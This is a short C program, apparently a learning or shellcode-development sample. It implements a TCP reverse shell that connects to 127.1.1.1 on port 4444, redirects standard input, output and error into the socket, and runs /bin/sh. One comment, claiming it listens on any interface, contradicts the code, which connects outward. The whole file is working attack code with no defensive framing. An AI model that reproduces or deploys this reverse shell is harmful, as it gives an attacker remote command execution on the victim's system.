#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main(int argc, int *argv[])
{
    // Create s for the socket
    int s;
    // Create sockaddr_in struct
	struct sockaddr_in addr;
	
    // AF_INET for IPv4
	addr.sin_family = AF_INET;
	// Set port number to 4444
	addr.sin_port = htons(4444);
	// Listen on any interface
	addr.sin_addr.s_addr = inet_addr("127.1.1.1");

    // Create the sock
	// AF_INET for IPv4
	// SOCK_STREAM for TCP connection
	s = socket(AF_INET, SOCK_STREAM, 0);

    // Connect to the remote machine
    connect(s, (struct sockaddr *)&addr, sizeof(addr));

    // Redirect the STDIN, STDOUT and STDERR into the socket
    for (int i = 0; i < 3; i++)
    {
        dup2(s, i);
    }

    // Execute /bin/sh
    execve("/bin/sh", 0, 0);

    return 0;
}